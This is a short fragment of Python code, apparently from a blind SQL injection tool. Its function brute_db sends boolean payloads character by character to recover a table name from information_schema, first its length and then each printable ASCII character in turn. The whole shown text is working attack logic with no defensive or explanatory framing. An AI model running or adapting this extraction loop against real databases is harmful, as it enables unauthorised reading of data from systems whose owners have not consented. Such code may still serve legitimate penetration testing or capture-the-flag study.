...
def brute_db(ip):
    ...
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        if send_payload(ip, f"LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database()))={i}"):
            length = i
            break
    ...
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            if send_payload(ip, f"SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database()),{i},1)='{chr(j)}'"):
                db_name += chr(j)
